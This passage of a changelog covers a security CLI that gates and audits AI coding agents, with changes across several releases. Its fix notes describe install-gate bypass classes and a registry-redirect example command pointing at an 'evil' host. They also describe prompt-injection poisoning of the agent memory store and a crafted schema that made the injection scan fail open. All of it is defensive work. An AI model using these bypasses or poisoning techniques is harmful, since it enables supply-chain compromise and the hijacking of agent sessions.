> straight from 4.3.0 to 5.0.0). Everything below ships as part of 5.0.0.

### Added — `kit standards`: the third quality dimension (P1–P5, #255–#257)

- **General gate (P1).** Language-agnostic code-quality metrics, measured the same
  way on every stack: complexity + function length (lizard), duplication (jscpd),
  file size / god-files (scc). Calibrated conservative defaults, overridable via
  `[standards.general]`. Pure parsers unit-tested against fixtures; tool runners
  resolve mise-first.
- **Per-language gate (P2 + P4).** Delegates to each ecosystem's canonical linter
  in report mode: eslint + `tsc --noEmit` (TS/JS), ruff + mypy (Python),
  `go vet` + `gofmt -l` (Go), clippy + `cargo fmt --check` (Rust), rubocop (Ruby),
  phpstan (PHP), ktlint (Kotlin), checkstyle (Java), `dotnet format` (C#),
  cppcheck (C/C++). Node-ecosystem tools resolve the PROJECT-LOCAL
  `node_modules/.bin` first — a global tsc resolves types against the wrong tree
  and floods phantom errors (a false positive is as harmful as a false green).
- **User plugins (P3).** Teams encode subjective standards under
  `.kit/standards.d/`; kit ships none. Declarative TOML rules (strict
  schema-validated, fail-closed on malformed/duplicate/bad-regex) and
  programmatic `*.mjs` `evaluate(ctx)` run in a restricted child (env allowlist —
  no secrets, hard timeout, output schema) and DETERMINISM-VERIFIED: each plugin
  runs twice and divergent output is rejected.
- **Platform gate (P4).** Container: hadolint over discovered Dockerfiles
  (bounded-depth, vendor-excluded). No Dockerfile ⇒ the gate honestly doesn't apply.
- **Ergonomics + parity (P5).** `kit standards freeze` (standards-only baseline);
  a score summary that counts SETUP GAPS (tool not installed) separately from real
  findings — the score is over gates that actually ran; MCP `kit_standards` tool
  sharing ONE orchestrator with the CLI (`standards-run.ts`) so the two surfaces
  can never disagree. `kit review` is now check + design + standards.
- Everywhere: baseline-aware net-new gating, warn-by-default, `--enforce` fails
  net-new findings AND setup gaps (fail-closed for CI).

### Added — detection past the manifest ceiling (#255)

- **Linguist-style source census.** When manifests mislead (polyglot repos, bare
  `package.json` over a php/ruby tree), a bounded file-count census (≤6000 files,
  vendor-excluded, JS+TS folded) breaks the tie. Conservative: only overrides a
  weak/bare package.json or fills the no-manifest fallback.

### Added — memory sync options (#255)

- **`[memory.sync] encrypt = false`** — the low-ceremony plaintext path: a plain
  SQLite snapshot (`VACUUM INTO`, 0600), no passphrase, no recipient. Secure by
  default: anything but the literal boolean `false` keeps encryption ON. No false
  green: `kit memory push` reports PLAINTEXT + "keep destination PRIVATE" instead
  of claiming the blob is encrypted; the pull path still injection-scans (R7)
  before merge.

### Changed — prose → enforcement (#258)

- **Statusline is injected, not requested.** The memory SessionStart hook now
  prints `kit statusline: …` to stdout (injected as agent context); the managed
  rules block no longer asks the agent to run it.
- **`kit gate-env`** — new PreToolUse gate: blocks a Write/Edit that puts a
  plaintext secret into a real `.env*` file BEFORE it lands (same detector as the
  plaintext scan; `.env.example`/templates exempt; placeholders allowed).
- **Gates are default-on in `kit agent teach`** (`--no-install-gate` opts out):
  un-triaged installs + plaintext .env\* secrets are blocked, not advised against.
  The generated "use kit" block shrank accordingly — it now states what is
  enforced; rules migrate out of prose as their gate ships.

### Fixed

- **PAL scope unification — statusline ⚠ and `pal list` can no longer disagree.**
  Three surfaces used three scope definitions (auto-tracker: absolute root;
  `pal add`: basename; statusline: unscoped) — a statusline showed ⚠156 (mostly
  dead temp-dir scopes) while `pal list` showed 0, hiding the project's own 6 open
  items. Canonical scope is the ABSOLUTE project root; `palList` also matches
  legacy basename rows; `quickPalCount` uses the same filter as `pal list`.
- `kit check --json` no longer leaks the update banner into the JSON envelope.
- `execFileNoThrow` gains `maxBuffer`/`cwd` options (large linter output;
  gate children).

## [4.3.0] - 2026-07-07

### Fixed — dogfood findings from real projects (a Turborepo + a Firebase repo)

- **Monorepo workspace resolution (#249).** `kit review`'s source-rooted checks
  (test coverage, a11y/design scan) said "no src/ found" in a Turborepo full of
  tsx under `apps/*`/`packages/*` — an empty green. New `src/workspaces.ts`
  resolves workspaces from `package.json` + `pnpm-workspace.yaml`; both checks
  scan each workspace's src dirs, and an empty scan is an explicit monorepo-aware
  skip — scanned-zero-files can never read as scanned-clean.
- **Public-by-design client keys get truthful advice (#250).** A Firebase
  web-config apiKey was flagged "leaked secret — rotate". The secrets scan now
  classifies public-by-design shapes (Firebase web config with co-occurring
  authDomain/projectId context, Sentry DSN, PostHog project key) and says
  "verify API-key restrictions + security rules" instead. Conservative: no
  context or unreadable file keeps the finding; a VERIFIED-LIVE credential is
  never waved through.
- **Active gcloud context is cross-checked against the repo's own projects
  (#251).** `kit init` captured another customer's ACTIVE gcloud project into a
  repo whose `.firebaserc` names its own. The context-lock offer now warns with
  both values named and suggests the repo's project; `kit context check` flags
  the mismatch (exit 1) even with no `[context]` declared.

### Changed — guarddog that can actually finish (#205)

- **Direct-deps target + clean-verdict cache + nightly sweep.** guarddog costs
  ~25s/package, so verifying a 12k-package lockfile always timed out into
  UNVERIFIED. It now verifies `package.json` (direct deps — guarddog's depth;
  the full tree keeps bumblebee + osv breadth), caches only COMPLETE clean
  verdicts keyed by a direct-deps hash (`~/.kit/guarddog-cache.json`; hits say
  the verdict date, never pretend to have just scanned), and a nightly
  fail-closed `guarddog-nightly` job in security.yml runs the uncached sweep
  with a 45-minute budget. `KIT_GUARDDOG_TIMEOUT_MS` overrides the local 300s.

### Added — evidence + memory reach

- **`kit coverage --verify` binds more evidence without a false-green shortcut
  (#206).** Self-audit results carry their stable `ruleId`; coverage binds by
  name OR rule id, resolves a curated alias map (broad category matching was
  deliberately rejected — it would let any passing category-mate "verify"
  unrelated controls), and runs the cheap command-backed evidence inline
  (gha-audit/ci-audit, transcript scan). On kit: 4 not-run → 1 (only the
  vault-backed secrets validation stays honestly unbound).
- **`kit memory merge --remap-project` + loud foreign-scope summary (#247).**
  A merged session keyed to another machine's path (a container's `-home-user`)
  is invisible to project-scoped search — "merged" must not read as "reachable".
  The merge now reports where sessions landed and points to `--remap-project` /
  `--global`; re-merging with the flag rehomes an already-imported session.

### Security — semgrep p/default: 31 findings → 0 (sec-09ef20)

- Pinned `actions/checkout@v4` + `actions/setup-node@v4` to commit SHAs in
  kit's own action and shipped templates (kit's gha-audit rule, applied to
  kit's own house).
- docker-compose: `no-new-privileges` + read-only root fs on postgres/redis.
- Escaped a key interpolated into a regex in the one builder that predated the
  escapeRegex convention; remaining regexp/formatstring findings suppressed
  per-site with justification (escaped internal identifiers, module constants).

## [4.2.0] - 2026-07-06

### Security — surface a trust-bearing KIT_DEVICE_ID override (#79)

- **`kit check` warns when a KIT_DEVICE_ID override is active on a real store.** The
  device id is trust-bearing — the device fences in `palList` / `palSyncFindings`
  auto-close another device's open findings by it, so a spoofed value could silently
  close them; the protection was doc-only. New `deviceIdOverrideActive()` +
  `device-id override` check warns (never fails by default; escalates under
  `--fail-on-warning`) when a well-formed override is set AND a store exists (a fence is
  actually in effect); skips otherwise. `src/memory/pal.ts`, `src/check-security.ts`.

### Security — shared-tier signature verification on the recall inject path (R4/#77)

- **Auto-injected team decisions are now signature-verified.** `recentDecisions`
  (SessionStart recovery / touched-decisions notice) replayed curated shared entries
  into every session as trusted "Curated team decisions" without checking their
  signature — so a tampered or forged entry rode in as trusted. `recallSafeShared`
  now filters before injection: a `bad-sig` (content changed after signing by a key we
  hold) is ALWAYS dropped, and under a committed `.kit-policy.signers` anchor only
  org-`trusted` entries are injected. With no anchor the common team case is preserved
  (only tamper is dropped). `src/memory/shared.ts`, `src/memory/hook.ts`.

### Security — `kit check` gates on memory-hooks liveness (R5/#71)

- **`kit check` now fails when the self-playing capture loop silently degraded.**
  Memory capture + statusline depend on hooks in `~/.claude/settings.json`; if they were
  installed here (durable marker present) but have since vanished, capture is silently off
  (the store looks installed but records nothing). `kit doctor` already flagged this and
  `kit memory uninstall` already audits the teardown; a new `memory hooks liveness` check
  folds the same liveness into the `kit check` security gate. Skips when never installed
  (CI / fresh machine) and after a clean uninstall, so it fails only on genuine silent
  degradation. `src/check-security.ts`.

### Security — PII parity: detect a Swedish personnummer at rest

- **`findSecrets` now detects a Swedish personnummer (Luhn-validated).** kit's patterns
  were secret-focused and caught no PII (the ruvnet/AIDefence research flagged the gap).
  A personnummer carries a Luhn check digit, so detection is high-precision — it validates
  the check digit and a plausible date rather than matching a bare 10/12-digit run, so a
  timestamp/id/phone number doesn't trip it. Matched values are masked (never echoed), so
  `kit memory scan` surfaces a personnummer leaked into the store without re-leaking it.
  `src/utils/redactSecrets.ts`.

### Security — MCP `kit_run` tokenization

- **`kit_run` tokenizes like a shell instead of a naive whitespace split.** `command.split(/\s+/)`
  turned `git commit -m "a b"` into the wrong argv and silently ran a different command. A new
  `shellSplit` util tokenizes POSIX-style (quotes, escapes) without evaluating anything (argv is
  run via execFile, no shell); an unterminated quote is refused, not mis-split. Same fix applied
  to the `.kit.toml [setup]` command runner. (The other holistic-review MCP items — mutating tools
  routed through governance/audit, and a single `computeCheckVerdict` shared by CLI and MCP — were
  already in place.) `src/utils/shellSplit.ts`, `src/mcp-server.ts`, `src/cli.ts`.

### Security — `kit check` now gates on a poisoned memory store (R3)

- **`kit check` scans the memory store for a replayable prompt-injection.** The store is
  replayed into every session via recall, so a poisoned entry is a delayed injection.
  Recall already excludes quarantined rows and sanitizes render paths; the missing piece
  was that `kit check` never scanned the store itself, so a message indexed BEFORE the
  insert-time quarantine gate (a non-quarantined high-confidence injection) was still
  recallable and `kit check` reported green. A new `memory injection` check flags those
  rows and names the one-command fix (`kit memory scan --injection --quarantine`, which
  excludes them from recall so the flag clears). It WARNS by default — the scanner can't
  tell a message _discussing_ an injection from a poisoned one, so a hard fail would turn
  every security researcher's gate permanently red — and ESCALATES to a fail under
  `--fail-on-warning` / strict CI. Fail-closed (`didNotRun`) if the store can't be
  opened/scanned; honest skip when there is no store. `src/memory/scan.ts`,
  `src/check-security.ts`.

### Integration — external findings ingestion: connect any scanner to `kit check`

- **`kit check` now folds third-party findings into its verdict.** A partner tool
  (a `kit-plugin-*`, or any in-house gate) appends one JSON object per line to
  `.kit-scan-results.jsonl` — `{source, severity, title?, id?, package?}` — and
  `kit check --category security` ingests it: `critical`/`high` **fail** the gate
  (like `npm audit`), `medium`/`low` **warn**, grouped per source. This is the inbound
  integration contract from the research: partners connect _to_ kit's stable surface;
  kit's core needs no per-partner code (the `kit-plugin-snyk`/`-wiz`/`-sentrux` plugins
  already write this file — nothing consumed it into the verdict until now).
  No-false-green: ingestion can only add/escalate findings, never emit a `pass`, and a
  garbage/hostile file cannot green the gate; unparseable lines are surfaced (never
  silently dropped). No file → no-op. Deterministic, zero-LLM. New `src/external-findings.ts`;
  documented in `docs/EXTERNAL_FINDINGS.md`.

### Security — self-healing scanner preflight: install a missing scanner instead of only failing (found by dogfooding)

- **`kit check` / `kit ci` now auto-provision a declared-but-missing scanner before
  scanning.** A missing scanner shouldn't just fail the gate — in an ephemeral
  environment it should be installed so the scan actually runs. `autoInstallScanners`
  installs any security scanner that is DECLARED in `.kit.toml [tools]` but not yet
  present (`semgrep`, `socket`, `trufflehog`, `trivy`, `osv-scanner`), then the scan
  runs against it. It is the runtime complement to `kit install` at env-setup (which
  provisions the same tools); this backstops the case where setup did not run. Only
  kit's known scanner refs are touched, and only when already declared, so it can
  never pull in a tool the project didn't opt into. Triage-gated and read-only-aware
  (via `installTools`), best-effort (a failed install leaves the check to fail closed),
  skipped when air-gapped, and opt-out via `--no-auto-install` / `KIT_CHECK_NO_AUTOINSTALL`.
  `src/install.ts`, `src/cli.ts`.

### Security — scanner-health strict: a missing scanner no longer passes as a warning (found by dogfooding)

- **`didNotRun` was missing on tool-absent scanner branches.** `check-security`'s
  contract is that a check which could not RUN because its tool is absent is
  `didNotRun` and FAILS the strict gate (`kit ci`) — "green means every check
  actually ran". Five branches violated it, returning a plain `warn`: `pip-audit`
  (with a `requirements.txt` present), `guarddog` (opted in, manifest present),
  `trivy` container / IaC / Maven scans (Dockerfile / Compose / Terraform / pom
  present), and the `license check` (neither `license-checker` nor `npx`
  available). A repo with Dockerfiles but no trivy therefore passed strict CI as a
  mere warning — a scanner-health false-green. All five now set `didNotRun`, so an
  unscanned-because-uninstalled scanner fails strict (still downgradable with
  `--lenient` / `KIT_CI_LENIENT`). Local `kit check` output is unchanged; opt-in and
  not-applicable cases remain honest skips. `src/check-security.ts`.

### Security — supply-chain gate, secrets/audit & control-plane hardening (backlog B1–B5)

A deep MEDIUM/LOW security sweep, each area hardened through repeated adversarial
re-attacks against the compiled build until it converged. Deterministic and
fail-closed throughout.

- **Install-gate parser (B1).** Closed ~20 fetch-and-execute bypass classes in the
  `gate-bash` hook: intra-word quoting, path/backslash/env-prefix binaries, process
  substitution + here-strings, missing verbs (`npm install-test`/`it`/`update`/`ci`,
  `yarn global add`, `uv run --with`, `corepack` incl. `corepack pnpm@9` dispatch,
  create/init initiators), shell `-c` (flag clusters `-lc`, ANSI-C `$'…'`,
  escaped-quote nesting), `${IFS}`/`${IFS<op>}` word-splitting, `npm exec -c/--call`
  and runner→package-manager chaining, bare-reinstall + registry-redirect fail-close,
  and `$VAR`/`xargs` indirection. Also fixed three hot-path algorithmic-complexity
  DoS issues (regex ReDoS, `SEGMENT_SPLIT` O(N²), queue-driver O(N²)) — all now
  linear with timing regression tests. `src/install-gate.ts`.
- **Triage version semantics (B2).** The gate stripped the version, so `npm i evil@1.2.3`
  was triaged as `latest` — a clean latest could vouch for a yanked/malicious pinned
  version. The pinned version/tag is now carried onto the triage ref and the triage
  script **resolves the spec to the exact version the manager installs** (semver /
  PEP 440: exact pins, dist-tags, ranges like `@2`/`@^1`/`<2`/`~=1.2`); npm alias specs
  (`name@npm:other`) fail closed. Documented that a PASS is an existence/health/version
  gate, not a malware verdict (that is opt-in GuardDog). `src/install-gate.ts`,
  `skills/triage/scripts/triage.py`.
- **Secrets & redaction (B3).** New detectors — raw PEM private keys, Azure `AccountKey=`,
  SendGrid, Slack `xapp-`, npm tokens, token-in-URL-userinfo (all ReDoS-bounded). The
  audit sink now redacts `error`/`metadata`/`operation`/`environment` **by value** before
  writing (covers the chain, remote push, and pending queue), the hash chain still
  verifies, and reassembly is prototype-pollution-safe. `env-inspect` no longer leaks a
  fixed prefix; the plaintext scanner now opens `.npmrc`/`id_rsa`/`*.pem`/`*.key`.
- **Control-plane (B4).** A monotonic, signed `policy.revision` ratchet rejects a replayed
  older policy over the untrusted transport (the floor is trusted only from a verifying
  on-disk policy). gzip-bomb guard bounds decompression on `kit memory pull`; the remote
  bundle fetch is now timeout- and size-capped. `src/control-plane/distribute.ts`,
  `src/policy-doc.ts`, `src/memory/backup.ts`.
- **Cross-cutting (B5).** IDs use `crypto.randomUUID()` (unguessable approval handles);
  the `agent_writes` authz lookup is `Object.hasOwn`-guarded against prototype keys;
  `.env.local` is created `0o600` atomically. `src/id-generator.ts`, `src/policy.ts`,
  `src/provision.ts`.
- **Triage skill refresh on upgrade (found by dogfooding).** The bundled triage script
  was only copied to `~/.claude/skills/triage` when ABSENT, so a kit upgrade that improved
  `triage.py` (e.g. the B2 version resolver, new secret patterns) never reached existing
  installs — the CLI silently kept running the old script (a pinned `pkg@1.2.3` was even
  false-blocked because the stale copy fetched the literal `pkg@1.2.3` name → 404). The
  installed copy is now version-stamped and refreshed when it was written by an older kit.
  `src/triage.ts`.
- **Install-gate hooks now route through the self-healing wrapper (found by dogfooding).**
  `kit agent-config --install-gate` wired each agent's PreToolUse hook with a baked
  absolute `<node> <cli.js> gate-bash`, diverging from the memory hooks (which prefer the
  stable `~/.kit/bin/kit` wrapper). Two costs: the gate ran in a non-login hook shell
  without the tool PATH, so triage's `python3`/`git` subprocesses could fail (fail-closed,
  but spamming false-blocks); and a baked node path frozen into a config goes stale if node
  moves (nvm/volta/fnm) or kit relocates, so the hook could fail to spawn. The gate now
  prefers the wrapper — one stable path kit refreshes in place — and `installAllInstallGates`
  writes the wrapper first (skipped in read-only mode). `src/agent-config.ts`.
- **`kit memory learn` no longer surfaces harness scaffolding (found by dogfooding).**
  Injected reminders, slash-command echoes, session-continuation banners, hook output and
  image placeholders are stored as `type='user'` rows and recur every session, so they
  dominated the "recurring instructions" ranking and buried the real ones (`<system-reminder>`,
  `/model`, "Continue from where you left off", "… hook success:", "[Image: …]"). A
  deterministic, high-precision `isBoilerplate` filter (structural tags + a leading slash
  command + a few verbatim harness phrases — never generic words) drops them before ranking.
  `src/memory/learn.ts`.
- **`kit memory scan --injection` surfaces quarantine state (found by dogfooding).** The scan
  reads every row regardless of quarantine, so re-running it after `--quarantine` showed the
  same high-confidence list and read as "still exposed" even though those rows are excluded
  from recall. Plain injection scans with high-confidence findings now print how many messages
  are already quarantined and point at `--quarantine`. Deliberately NOT a path/content allowlist:
  a suppression channel on an injection scanner would be a bypass. `src/commands/memory.ts`.

### Security — red-team critical fixes

A code-in-hand adversarial red-team of kit found three CONFIRMED critical
false-greens; all three are now closed:

- **Install-gate registry-redirect bypass.** `npm_config_registry=http://evil/ npm i lodash`
  (and `PIP_INDEX_URL=…`, `--registry=…`, `-i <url>`) previously triaged the reputable
  public NAME and returned **triage PASS** while the package manager pulled the code
  from an attacker registry. `parseInstallCommand` now detects install-SOURCE
  redirects (env vars + flags) and marks the command **unverifiable** (fail-closed)
  unless the source is the known public default. `src/install-gate.ts`.
- **CI publish supply-chain: tag-push → npm as `latest`.** `publish.yml` ran from the
  pushed tag's tree and imported+ultimately-trusted the in-repo `maintainer-pubkey.asc`,
  so anyone who could push a `v*` tag could swap the key and ship attacker code with
  valid provenance. The publish job now runs under a protected `environment:`
  (`npm-publish`, gate `NPM_TOKEN` behind required reviewers) and **pins the expected
  key fingerprint** in a `MAINTAINER_KEY_FPR` secret — a mismatched/ swapped in-repo
  key is refused (fail-closed; the secret is required). `.github/workflows/publish.yml`.
- **exec-broker "dead code" false-green.** The resource gates only inspected declared
  effect arrays, which the production caller never populated — so every op passed
  regardless of policy. `brokerExec` now **fail-closed-denies a gated op that declares
  no effect contract** under an active policy (a genuinely effect-free op opts in via
  `declaredEffects: true`), turning a silent rubber-stamp into real enforcement.
  `src/exec-broker/broker.ts`.

### Added

- **Control-plane distribution — signed policy + revocation propagation** (Pelare 2,
  `src/control-plane/distribute.ts`). A `PolicyBundle` (raw `.kit-policy.toml` +
  `.kit-policy.sig` + signed revocations) can be fetched from a file (air-gapped) or
  an opt-in `https:` URL (injectable `fetchImpl`), then `verifyPolicyBundle` verifies
  it **fully offline** against the repo's committed `.kit-policy.signers` trust anchor
  — reusing the exact `verifyPolicy` codepath (no crypto re-implementation) — and
  `applyPolicyBundle` writes it ONLY when valid, merging each revocation after a
  per-record signature check against the anchor. Fail-closed throughout (untrusted
  signer, tampered policy/revocation, or malformed bundle → rejected, `root`
  untouched). New `appendRevocations` primitive merges pre-verified records
  (dedup) without re-signing. No egress by default; zero LLM.

- **exec-broker wired into the MCP mutating-tool path (opt-in)** via `runBrokered`
  (`src/exec-broker/`) and `runGovernedBrokered` (`src/governance-middleware.ts`).
  The Pelare-3 resource gates (egress / fs-write / env) now compose ON TOP of the
  governance floor at the four MCP mutating tools. It is **opt-in and
  non-breaking**: with no `.kit-exec-broker.json` (nor `KIT_EXEC_BROKER_POLICY`)
  present, `runBrokered` is a transparent passthrough, so behavior is identical
  until a user drops a policy in. A present-but-malformed policy fails **closed**
  (deny) — a broken gate never silently disables enforcement.
- **RBAC identity providers for Microsoft Entra ID and Google Cloud Identity**
  (`src/rbac/providers-cloud.ts`), siblings of the GitHub backend. Both compile
  role bindings at ENROLLMENT time behind an injectable membership source (real
  wiring: Graph `GET /v1.0/users/{id}/memberOf` with `@odata.nextLink` pagination;
  Cloud Identity `memberships:searchTransitiveGroups` with `nextPageToken`), map
  group membership → kit roles via a `roleMap`, and are namespaceable by
  tenant/domain. Fail-closed (a non-OK response throws, never spurious empty
  membership); `KIT_RBAC_ENTRA_API` / `KIT_RBAC_GOOGLE_API` override the base URL.
  Enrollment-only — never imported by the offline decision path, so RBAC stays
  zero-network at decision time across all three IdPs. (Live endpoint shapes are
  the documented ones; verify against a real tenant before production reliance.)

## [4.1.0] - 2026-07-04

A wholly **additive**, backward-compatible release along two axes — broader agent
coverage and the first **v1 foundations of the 5.0 pillars**. Semver
note: nothing here breaks an existing contract (all-new modules, no default
flipped), so this is a MINOR, not a major. The pillar work lands behind the
interfaces the 5.0 design calls for, but the _breaking_ capabilities that
will justify **5.0.0** — hardware-key migration, enforcement-on-by-default, a
required control plane — deliberately do NOT ship here; `5.0.0` is reserved for
when the first of those lands. Built via a multi-agent workflow (design →
implement → adversarial verify), then hardened on the verify findings.

### Added — 5.0 pillar foundations

- **Pelare 1 — hardware-rooted identity behind a `KeyStore` port** (`src/keystore/`).
  A `KeyStore` interface (`available`/`publicKeyPem`/`sign`/`create`/`rotate`) with a
  `file` backend that WRAPS the existing 0600-file identity (pure delegation — the
  deterministic offline `verifySignature` is untouched), plus honest `secure-enclave`
  (darwin) and `tpm` (linux/win) extension-point stubs that report
  `available()={ok:false, reason}` and fail-closed on use (never a false green).
  `resolveKeyStore()` picks the best available backend, else falls back to file and
  ALWAYS surfaces the degradation; a forced-but-unavailable `KIT_KEYSTORE` refuses to
  silently downgrade.
- **Pelare 3 — gate → runtime exec-broker** (`src/exec-broker/`). Pure, fail-closed
  decision gates — `checkEgress` (hostname allowlist, subdomain-aware, default-deny),
  `checkFsWrite` (resolve traversal, writes only within project root), `scopeEnv`
  (least-privilege env) — and `brokerExec`, which enforces an operation's DECLARED
  effects BEFORE running, default-denies with no policy, scopes env to the REQUESTED
  keys, adds an impure realpath symlink-escape check, and writes a fail-closed
  pre-exec audit entry. Composes on top of `runGoverned` (resources vs identity/budget).
- **Pelare 2 — RBAC bound to an IdP at enrollment, enforced offline** (`src/rbac/`).
  Role-bindings (`subject kid → role → permissions`) ride inside the org-signed
  `.kit-policy`, so authority is verified OFFLINE against `.kit-policy.signers` — there
  is ZERO network at decision time. `can()`/`effectivePermissions()` are pure and
  fail-closed (unsigned/unknown-subject/malformed → deny; prototype-safe role lookup;
  local revocation as a secondary deny). `IdentityProvider` + a GitHub backend map
  team membership → roles at ENROLLMENT time behind an injectable fetch (Azure/Entra
  and Google documented as future backends of the same interface); a non-OK GitHub
  response fails closed (throws) rather than reporting spurious empty membership.

### Added — wider agent coverage

Broaden kit's four-surface agent model (rules / memory / install-gate / lifecycle
hooks) across the coding-agent ecosystem, shipping only where the transcript path,
format, and block contract are verified — and naming the rest as honest
limitations rather than faking coverage.

- **Six more agents onboarded (research-driven).** kit now indexes memory and/or
  enforces installs for a much wider agent set. Every surface below was verified
  against the agent's own format before shipping; unverifiable surfaces are
  documented as limitations, not stubbed.
  - **AWS Kiro CLI — memory.** New parser for `kiro-cli/data.sqlite3` (same
    storage design as Amazon Q; reads `conversations_v2`, falling back to
    `conversations`), tagged `harness=kiro`. Read-only, incremental, fail-safe.
    Kiro is the 10th indexed harness. (Its install-gate + rules shipped earlier.)
  - **Factory Droid — memory + install-gate.** Indexes its Claude-Code-compatible
    JSONL transcripts under `~/.factory/projects/**/*.jsonl` (`harness=droid`),
    and wires a PreToolUse gate to `.factory/hooks.json`. The one adaptation vs
    the Claude gate is matcher `"Execute"`; `kit gate-bash` is unchanged.
  - **Aider — memory + rules.** Parses its project-local markdown chat log
    (`$GIT_ROOT/.aider.chat.history.md`, honoring `AIDER_CHAT_HISTORY_FILE`),
    `harness=aider`. A **bespoke** rules installer writes `CONVENTIONS.md` AND
    wires `read: CONVENTIONS.md` into `.aider.conf.yml` (Aider auto-reads no
    rules file, so the block alone would be a no-op). No install-gate: Aider has
    no pre-tool hook surface.
  - **Google Antigravity — memory + install-gate.** New JSONL parser for
    `~/.gemini/{antigravity-cli,antigravity-ide,antigravity}/brain/*/.system_generated/logs/transcript_full.jsonl`
    (a real gap the `~/.gemini/tmp` Gemini parser never covered), `harness=antigravity`.
    Install-gate to the workspace `.agents/hooks.json` (PreToolUse, matcher
    `run_command`).
  - **Augment — install-gate.** Wires a PreToolUse gate to `.augment/settings.json`
    (matcher `"launch-process"`). Rules already routed via `.augment-guidelines`.
  - **Kilo Code — rules marker.** `.kilocode` / `.kilo` / `kilo.jsonc` now route
    the kit block into `AGENTS.md`. (Memory + gate deferred — contradicted across
    Kilo product generations; no false-green.)
- **`extractCommandFromHookPayload` now spans two more wire shapes.** It reads
  Antigravity's `toolCall.args.CommandLine` and Sourcegraph Amp's
  `arguments.command` in addition to the existing shapes — a pure,
  backward-compatible extension so those agents' gates need no `--format` adapter.
- **AWS Kiro install-gate.** `kit agent-config --install-gate` now wires the
  fail-closed PreToolUse gate for Kiro CLI: it adds a `hooks.preToolUse` entry
  (matcher `execute_bash`) to each `.kiro/agents/*.json` agent config. Kiro is
  Amazon-Q-lineage — same agent-config hook schema, same `tool_input.command`
  STDIN, same exit-2-blocks — so `kit gate-bash` works unchanged. Per-agent like
  Amazon Q: wires every existing agent file, and SKIPS honestly (no false-green)
  when none exist rather than writing a partial agent config. Kiro is now the 8th
  install-gated agent.
- **Wider agent coverage for the rules/context file.** `kit agent-config` now writes
  and detects three more agents: **Gemini CLI** (`GEMINI.md` — kit already
  indexed + install-gated Gemini but never wrote its rules file, only status-checked
  it), and **Augment** (`.augment-guidelines`). AGENTS.md detection also now
  recognizes **AWS Kiro** (`.kiro/`) and **Factory Droid** (`.factory/`), which read
  the root `AGENTS.md` (the Linux-Foundation cross-tool standard) — so a Kiro- or
  Droid-only project gets its kit block wired. Deeper coverage (memory indexing)
  for these agents is tracked in kit-research `agent-coverage.md`.

### Fixed

- **The update-check version comparator no longer mis-parses a prerelease/patch.**
  `isNewer` split the version on `.` and `Number()`-cast each part, so
  `"4.0.6-rc.1"` → `["4","0","6-rc","1"]` → `Number("6-rc")` = `NaN`, and a genuinely
  newer prerelease patch was reported as **not** newer (no update notice). It now
  compares on the numeric `MAJOR.MINOR.PATCH` core (prerelease/build suffixes
  stripped first) and is exported + directly tested (equal / older / newer /
  prerelease / build / malformed). `kit memory status` (alias of `stats`) is now
  documented in `kit memory --help`.

### Security — memory as attack surface

- **Recall now EXCLUDES a poisoned message, not just badges it (R3).** A message
  carrying a high-confidence prompt-injection pattern is quarantined on insert
  (`messages.quarantined`, schema v7) and left out of both recall paths —
  `kit memory search` (FTS) and SessionStart recovery (`recentMessages`) — by
  default, so a poisoned transcript line is never re-injected into a later,
  more-trusted session. `kit memory search --include-quarantined` shows them (still
  badged) for inspection; `kit memory scan --injection --quarantine` backfills rows
  indexed before the gate. Deterministic (`findInjection`), zero-LLM; older rows
  default to un-quarantined (backward-compatible).

### Fixed — self-playing loop liveness (R5)

- **A silently failed background capture is now surfaced on the next SessionStart.**
  The detached SessionEnd / mid-session index workers run with stdio ignored, so
  their only failure channel is `~/.kit/session-end.log` — whose docstring promised
  it was "surfaced on the next SessionStart", but nothing ever read it, so a failed
  capture stayed invisible (the store looked captured, recorded nothing). `kit`'s
  SessionStart recovery now reads and CONSUMES that log (each event surfaces exactly
  once) and warns that recent turns may be unsearchable.
- **PAL auto-releases a stale claim so a crashed agent can't hide a blocked item.**
  `kit memory pal claim` flips an item open→claimed, but a crashed/abandoned claimer
  never released it — so it dropped out of every default (open) surface indefinitely,
  silently blocking the human waiting on it. `reapStaleClaims()` (run inside
  `palList`) releases any claim older than 24h back to `open` so it resurfaces.
- **Tearing down the memory hooks is now audited.** `kit memory uninstall` removes
  the self-playing capture loop but wrote settings with no audit trail. It now emits
  a `memory.hooks.uninstall` audit event (best-effort, fail-open) so a teardown isn't
  invisible where audit is enabled — a no-op when audit is off (the default), so no
  surprise files appear.

### Security — memory sync

- **The incoming-store injection gate (R7) no longer fails open on a crafted schema.**
  `kit memory sync` / auto-pull scan an incoming store for injection before merging,
  but the scan ran a rich `SELECT` that also read auxiliary columns (e.g. `messages.cwd`).
  An attacker could drop `cwd` so the scan threw "no such column", the gate's `catch`
  fail-OPENED, and the payload in `messages.content` merged anyway (`mergeDb` tolerates
  a missing `cwd`). The scan is now **resilient**: if the rich SELECT can't run it falls
  back to scanning each text column that actually exists, so a missing auxiliary column
  can never suppress scanning of a present payload column. And the sync gate now **fails
  closed** on a genuine scan error — untrusted input we can't certify clean is refused,
  not merged (override with `KIT_MEMORY_ALLOW_UNSAFE=1`).

### Security — MCP surface

- **The mutating MCP tools now pass through the governance/audit floor.** `kit_run`,
  `kit_secrets`, `kit_install`, and `kit_fix` previously ran with only a read-only-mode
  guard — bypassing the revocation / budget / permission / expired-secret checks and
  the tamper-evident audit log that the CLI applies to the same operations. They now
  route through a new **MCP-safe** governed executor (`runGoverned`) that runs the same
  deterministic pre-flight checks and emits the same audit events, but NEVER prompts:
  it writes nothing to stdout (which on the MCP stdio transport IS the JSON-RPC
  channel) and **fail-closed-denies** anything that would need interactive approval
  (a destructive op, or a permission only approval can override) — run those via the
  kit CLI. A blocked tool returns a `{ ok: false, governance: "denied", error }` result.

### Changed

- **The zero-LLM invariant is now machine-enforced.** kit is deterministic and never
  calls a model — it emits prompts for a bring-your-own LLM. That rule lived in ~35
  code comments but nothing failed the build if an LLM SDK crept in. An eslint
  `no-restricted-imports` rule now bans the known model SDKs (`openai`, `@anthropic-ai/*`,
  `@google/generative-ai`, `cohere-ai`, `@mistralai/*`, `langchain`, the Vercel `ai`
  SDK, …) in `src/`, so the most important invariant is enforced like the command
  contract, not left to review. (`@modelcontextprotocol` — a protocol, not a model
  client — is intentionally allowed.)

### Fixed

- **`kit team invite` / `kit team member remove` no longer print fake success.** Both
  were stubs that printed "Invitation sent" / "Member removed" and exited 0 with no
  backend behind them — a literal false-green, the exact thing kit's thesis condemns.
  They now fail honestly (non-zero, "not implemented — no team backend configured"),
  matching how `kit team create` already behaved.
- **`kit check` (CLI) and `kit_check` (MCP) can no longer disagree on green.** The
